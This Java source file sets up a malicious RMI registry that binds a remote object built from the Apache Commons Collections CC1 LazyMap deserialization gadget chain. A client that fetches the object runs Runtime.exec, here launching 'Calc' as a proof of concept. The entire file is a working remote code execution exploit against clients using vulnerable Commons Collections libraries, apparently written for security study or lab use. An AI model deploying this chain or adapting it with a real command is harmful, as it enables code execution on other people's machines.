package org.example.serverAttackRegistry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class Server {
    public static void main(String[] args) throws Exception {
        System.out.println("Remote Server start...");

        // 1.create registry
        Registry registry = LocateRegistry.createRegistry(1099);

        // 2.generate remote object
        // dynamic proxy cast to Remote type
        Object evilObject = getCCPayload();
        Remote remoteObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),new Class[] { Remote.class }, (InvocationHandler) evilObject));
        // 3.bind the remote object to the registry
        Naming.rebind("rmi://localhost:1099/remoteObject", remoteObject);

    }
    public static Object getCCPayload() throws Exception {
        //CC1-LazyMap
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"Calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put("key","value");
        Map lazyMap = (Map) LazyMap.decorate(hashMap,chainedTransformer);
//        lazyMap.get("Jasper");
        Class<?> aihClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor aihConstuctor = aihClass.getDeclaredConstructor(Class.class,Map.class);
        aihConstuctor.setAccessible(true);
        InvocationHandler aih = (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);
        Map lazyMapProxy = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);

        InvocationHandler aih2 = (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);
        return aih2;
    }
}
